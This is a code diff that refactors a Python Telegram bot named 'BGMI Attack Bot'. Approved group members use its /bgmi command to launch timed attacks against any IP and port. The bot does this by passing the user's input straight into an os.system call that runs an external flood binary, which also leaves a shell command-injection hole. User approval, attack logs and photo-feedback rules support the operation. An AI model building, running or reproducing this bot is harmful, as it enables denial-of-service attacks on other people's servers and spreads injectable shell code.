@@ -1,6 +1,4 @@
 import os
-import time
-import threading
 import asyncio
 from datetime import datetime, timedelta
 from telegram import Update
@@ -27,26 +25,28 @@ banned_users = {}
 attack_logs = []
 current_attack = None
 
+# Data handling
 def load_data():
-    global approved_users, user_attacks, attack_logs
     try:
         with open("approved_users.txt", "r") as f:
-            approved_users = set(int(line.strip()) for line in f if line.strip())
+            approved_users.update(int(line.strip()) for line in f if line.strip())
     except FileNotFoundError:
-        approved_users = set()
+        pass
     
     try:
         with open("user_attacks.txt", "r") as f:
-            user_attacks = {int(k): int(v) for line in f 
-                          for k, v in [line.strip().split()]}
+            for line in f:
+                if line.strip():
+                    user_id, count = map(int, line.strip().split())
+                    user_attacks[user_id] = count
     except FileNotFoundError:
-        user_attacks = {}
+        pass
     
     try:
         with open("logs.txt", "r") as f:
-            attack_logs = [line.strip() for line in f if line.strip()]
+            attack_logs.extend(line.strip() for line in f if line.strip())
     except FileNotFoundError:
-        attack_logs = []
+        pass
 
 def save_data():
     with open("approved_users.txt", "w") as f:
@@ -58,44 +58,31 @@ def save_data():
     with open("logs.txt", "w") as f:
         f.write("\n".join(attack_logs))
 
-def is_owner(user_id):
-    return user_id == OWNER_ID
+# Helper functions
+def is_owner(user_id): return user_id == OWNER_ID
+def is_approved(user_id): return user_id in approved_users or is_owner(user_id)
+def is_banned(user_id): return user_id in banned_users and datetime.now() < banned_users[user_id]
 
-def is_approved(user_id):
-    return user_id in approved_users or is_owner(user_id)
-
-def is_banned(user_id):
-    if user_id in banned_users:
-        if datetime.now() < banned_users[user_id]:
-            return True
-        del banned_users[user_id]
-    return False
-
+# Command handlers
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not bot_active or update.effective_chat.id != GROUP_ID:
-        return
-    
-    user = update.effective_user
+    if not bot_active or update.effective_chat.id != GROUP_ID: return
     await update.message.reply_text(
-        f"🚀 *Welcome {user.first_name} to BGMI Attack Bot!* 🚀\n\n"
+        f"🚀 Welcome to BGMI Attack Bot!\n\n"
         "Use /help for commands\n"
         "Use /rule for rules",
         parse_mode=ParseMode.MARKDOWN
     )
 
 async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not bot_active or update.effective_chat.id != GROUP_ID:
-        return
-    
+    if not bot_active or update.effective_chat.id != GROUP_ID: return
     help_text = """
 *Available Commands:*
-
 /start - Welcome message
 /help - Show commands
 /rule - Show rules
 /bgmi IP PORT TIME - Attack (max 180s)
 
-*Admin Commands (Owner Only):*
+*Admin Commands:*
 /admincmd - Show admin commands
 /add USER_ID - Approve user
 /remove USER_ID - Remove user
@@ -110,113 +97,102 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)
 
 async def rule(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not bot_active or update.effective_chat.id != GROUP_ID:
-        return
-    
+    if not bot_active or update.effective_chat.id != GROUP_ID: return
     rules_text = """
 *RULES:*
-
-1️⃣ Only one attack at a time
-2️⃣ Must give photo feedback after attack
-3️⃣ No duplicate feedbacks
-4️⃣ Max attack time: 180 seconds
-5️⃣ Contact @HMSahil for help
-
-Violations will result in bans!
+1. Only one attack at a time
+2. Must give photo feedback after attack
+3. No duplicate feedbacks
+4. Max attack time: 180 seconds
+5. Contact @HMSahil for help
 """
     await update.message.reply_text(rules_text, parse_mode=ParseMode.MARKDOWN)
 
 async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global current_attack
     
-    if not bot_active or update.effective_chat.id != GROUP_ID:
-        return
+    if not bot_active or update.effective_chat.id != GROUP_ID: return
     
     user = update.effective_user
     user_id = user.id
-    username = user.username or user.first_name
     
+    # Check requirements
     if user_id not in user_feedbacks:
-        await update.message.reply_text(
-            "❌ Pehle feedback do photo ke saath!\n"
-            "Tabhi next attack kar paoge.",
-            parse_mode=ParseMode.MARKDOWN
-        )
+        await update.message.reply_text("❌ First send photo feedback!", parse_mode=ParseMode.MARKDOWN)
         return
     
     if current_attack:
-        remaining = (current_attack['end_time'] - datetime.now()).seconds
         await update.message.reply_text(
-            f"⚠️ {current_attack['username']} attack kar raha hai!\n"
-            f"Wait karo {remaining} seconds...",
+            f"⚠️ {current_attack['username']} is currently attacking!",
             parse_mode=ParseMode.MARKDOWN
         )
         return
     
+    # Validate command
     if len(context.args) != 3:
         await update.message.reply_text("Format: /bgmi IP PORT TIME")
         return
     
     try:
         ip, port, attack_time = context.args[0], context.args[1], int(context.args[2])
+        if attack_time > 180:
+            await update.message.reply_text("Max attack time is 180s")
+            return
     except ValueError:
         await update.message.reply_text("Invalid time format")
         return
     
-    if attack_time > 180:
-        await update.message.reply_text("Maximum attack time 180 seconds")
-        return
-    
+    # Start attack
+    username = user.username or user.first_name
     current_attack = {
         'user_id': user_id,
         'username': username,
-        'end_time': datetime.now() + timedelta(seconds=attack_time)
+        'end_time': datetime.now() + timedelta(seconds=attack_time),
+        'ip': ip,
+        'port': port
     }
     
     await update.message.reply_text(
-        f"⚡ Attack shuru by {username}!\n"
+        f"⚡ {username} started attack!\n"
         f"IP: {ip}\nPort: {port}\nTime: {attack_time}s",
         parse_mode=ParseMode.MARKDOWN
     )
     
+    # Execute attack
     os.system(f"./fuck {ip} {port} {attack_time}")
     
+    # Log attack
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     attack_logs.append(f"{timestamp} - {username} attacked {ip}:{port} for {attack_time}s")
     user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
     
+    # Remove feedback requirement
     if user_id in user_feedbacks:
         del user_feedbacks[user_id]
     
-    threading.Timer(attack_time, lambda: asyncio.run(attack_complete(update, context))).start()
+    # Schedule completion
+    asyncio.create_task(finish_attack(update, context, attack_time))
     save_data()
 
-async def attack_complete(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def finish_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, attack_time: int):
     global current_attack
+    await asyncio.sleep(attack_time)
     if current_attack:
-        username = current_attack['username']
         await context.bot.send_message(
             chat_id=GROUP_ID,
-            text=f"✅ Attack complete by {username}!\n"
-                 "Ab photo feedback bhejo next attack ke liye!",
+            text=f"✅ Attack completed by {current_attack['username']}!\n"
+                 "Send photo feedback for next attack",
             parse_mode=ParseMode.MARKDOWN
         )
         current_attack = None
 
+# Admin commands
 async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not bot_active or update.effective_chat.id != GROUP_ID:
-        return
-    
     if not is_owner(update.effective_user.id):
-        await update.message.reply_text(
-            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
-            parse_mode=ParseMode.MARKDOWN
-        )
+        await update.message.reply_text("❌ Owner command only!", parse_mode=ParseMode.MARKDOWN)
         return
-    
-    admin_text = """
+    await update.message.reply_text("""
 *Admin Commands:*
-
 /add USER_ID - Approve user
 /remove USER_ID - Remove user
 /boton - Turn bot on
@@ -226,48 +202,20 @@ async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 /broadcast MESSAGE - Broadcast to all
 /clearlogs - Clear all logs
 /clearuser - Clear all users
-"""
-    await update.message.reply_text(admin_text, parse_mode=ParseMode.MARKDOWN)
+""", parse_mode=ParseMode.MARKDOWN)
 
 async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not bot_active or update.effective_chat.id != GROUP_ID:
-        return
-    
-    if not is_owner(update.effective_user.id):
-        await update.message.reply_text(
-            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    if len(context.args) < 1:
-        await update.message.reply_text("Usage: /add USER_ID [DURATION_HOURS]")
-        return
-    
+    if not is_owner(update.effective_user.id): return
     try:
         user_id = int(context.args[0])
-        duration = int(context.args[1]) if len(context.args) > 1 else 24
         approved_users.add(user_id)
         save_data()
-        await update.message.reply_text(f"✅ User {user_id} approved for {duration} hours")
-    except ValueError:
-        await update.message.reply_text("Invalid user ID or duration")
+        await update.message.reply_text(f"✅ User {user_id} approved")
+    except (IndexError, ValueError):
+        await update.message.reply_text("Usage: /add USER_ID")
 
 async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not bot_active or update.effective_chat.id != GROUP_ID:
-        return
-    
-    if not is_owner(update.effective_user.id):
-        await update.message.reply_text(
-            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
-    if len(context.args) < 1:
-        await update.message.reply_text("Usage: /remove USER_ID")
-        return
-    
+    if not is_owner(update.effective_user.id): return
     try:
         user_id = int(context.args[0])
         if user_id in approved_users:
@@ -276,180 +224,111 @@ async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(f"✅ User {user_id} removed")
         else:
             await update.message.reply_text("User not in approved list")
-    except ValueError:
-        await update.message.reply_text("Invalid user ID")
+    except (IndexError, ValueError):
+        await update.message.reply_text("Usage: /remove USER_ID")
 
 async def bot_on(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_chat.id != GROUP_ID:
-        return
-    
-    if not is_owner(update.effective_user.id):
-        await update.message.reply_text(
-            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
+    if not is_owner(update.effective_user.id): return
     global bot_active
     bot_active = True
-    await update.message.reply_text("✅ Bot is now ACTIVE")
+    await update.message.reply_text("✅ Bot activated")
 
 async def bot_off(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_chat.id != GROUP_ID:
-        return
-    
-    if not is_owner(update.effective_user.id):
-        await update.message.reply_text(
-            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
+    if not is_owner(update.effective_user.id): return
     global bot_active
     bot_active = False
-    await update.message.reply_text("❌ Bot is now INACTIVE")
+    await update.message.reply_text("❌ Bot deactivated")
 
 async def all_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not bot_active or update.effective_chat.id != GROUP_ID:
-        return
-    
-    if not is_owner(update.effective_user.id):
-        await update.message.reply_text(
-            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
+    if not is_owner(update.effective_user.id): return
     if not approved_users:
         await update.message.reply_text("No approved users")
         return
-    
-    users_list = "\n".join(f"👤 {user_id}" for user_id in approved_users)
-    await update.message.reply_text(f"*Approved Users:*\n{users_list}", parse_mode=ParseMode.MARKDOWN)
+    await update.message.reply_text(
+        "*Approved Users:*\n" + "\n".join(map(str, approved_users)),
+        parse_mode=ParseMode.MARKDOWN
+    )
 
 async def show_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not bot_active or update.effective_chat.id != GROUP_ID:
-        return
-    
-    if not is_owner(update.effective_user.id):
-        await update.message.reply_text(
-            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
+    if not is_owner(update.effective_user.id): return
     if not attack_logs:
-        await update.message.reply_text("No attack logs available")
+        await update.message.reply_text("No attack logs")
         return
-    
     with open("attack_logs.txt", "w") as f:
         f.write("\n".join(attack_logs))
-    
-    await update.message.reply_document(document=open("attack_logs.txt", "rb"))
+    await update.message.reply_document(open("attack_logs.txt", "rb"))
 
 async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not bot_active or update.effective_chat.id != GROUP_ID:
-        return
-    
-    if not is_owner(update.effective_user.id):
-        await update.message.reply_text(
-            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
+    if not is_owner(update.effective_user.id): return
     if not context.args:
-        await update.message.reply_text("Usage: /broadcast YOUR_MESSAGE")
+        await update.message.reply_text("Usage: /broadcast MESSAGE")
         return
-    
     message = " ".join(context.args)
     for user_id in approved_users:
         try:
             await context.bot.send_message(chat_id=user_id, text=message)
-        except Exception as e:
-            print(f"Failed to send to {user_id}: {e}")
-    
-    await update.message.reply_text(f"✅ Broadcast sent to {len(approved_users)} users")
+        except:
+            pass
+    await update.message.reply_text(f"Broadcast sent to {len(approved_users)} users")
 
 async def clear_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not bot_active or update.effective_chat.id != GROUP_ID:
-        return
-    
-    if not is_owner(update.effective_user.id):
-        await update.message.reply_text(
-            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
+    if not is_owner(update.effective_user.id): return
     global attack_logs
     attack_logs = []
     save_data()
-    await update.message.reply_text("✅ All logs cleared")
+    await update.message.reply_text("✅ Logs cleared")
 
 async def clear_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not bot_active or update.effective_chat.id != GROUP_ID:
-        return
-    
-    if not is_owner(update.effective_user.id):
-        await update.message.reply_text(
-            "❌ OWNER TO NAHI HAI LODU AGAR APNE GAND DA TO SHYAD MAI SOCHU",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        return
-    
+    if not is_owner(update.effective_user.id): return
     global approved_users
     approved_users = set()
     save_data()
-    await update.message.reply_text("✅ All approved users removed")
+    await update.message.reply_text("✅ Approved users cleared")
 
+# Photo handler
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not bot_active or update.effective_chat.id != GROUP_ID:
-        return
+    if not bot_active or update.effective_chat.id != GROUP_ID: return
     
     user = update.effective_user
-    user_id = user.id
     photo_id = update.message.photo[-1].file_id
     
     if photo_id in user_feedbacks.values():
-        banned_users[user_id] = datetime.now() + timedelta(minutes=5)
-        await update.message.reply_text(
-            "❌ Same feedback detected!\n"
-            "5 minute ban lagaya gaya hai.",
-            parse_mode=ParseMode.MARKDOWN
-        )
+        banned_users[user.id] = datetime.now() + timedelta(minutes=5)
+        await update.message.reply_text("❌ Duplicate feedback! 5min ban", parse_mode=ParseMode.MARKDOWN)
         return
     
-    user_feedbacks[user_id] = photo_id
-    await update.message.reply_text(
-        "✅ Feedback accept ho gaya!\n"
-        "Ab aap /bgmi command use kar sakte hain.",
-        parse_mode=ParseMode.MARKDOWN
-    )
+    user_feedbacks[user.id] = photo_id
+    await update.message.reply_text("✅ Feedback accepted! Now you can attack", parse_mode=ParseMode.MARKDOWN)
 
 def main():
     load_data()
     app = Application.builder().token(TOKEN).build()
     
     # Command handlers
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("help", help_cmd))
-    app.add_handler(CommandHandler("rule", rule))
-    app.add_handler(CommandHandler("bgmi", bgmi))
-    app.add_handler(CommandHandler("admincmd", admin_cmd))
-    app.add_handler(CommandHandler("add", add_user))
-    app.add_handler(CommandHandler("remove", remove_user))
-    app.add_handler(CommandHandler("boton", bot_on))
-    app.add_handler(CommandHandler("botoff", bot_off))
-    app.add_handler(CommandHandler("allusers", all_users))
-    app.add_handler(CommandHandler("logs", show_logs))
-    app.add_handler(CommandHandler("broadcast", broadcast))
-    app.add_handler(CommandHandler("clearlogs", clear_logs))
-    app.add_handler(CommandHandler("clearuser", clear_users))
+    commands = [
+        ('start', start),
+        ('help', help_cmd),
+        ('rule', rule),
+        ('bgmi', bgmi),
+        ('admincmd', admin_cmd),
+        ('add', add_user),
+        ('remove', remove_user),
+        ('boton', bot_on),
+        ('botoff', bot_off),
+        ('allusers', all_users),
+        ('logs', show_logs),
+        ('broadcast', broadcast),
+        ('clearlogs', clear_logs),
+        ('clearuser', clear_users)
+    ]
+    
+    for cmd, handler in commands:
+        app.add_handler(CommandHandler(cmd, handler))
     
     # Photo handler
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     
+    print("BGMI Attack Bot is running...")
     app.run_polling()
 
 if __name__ == "__main__":
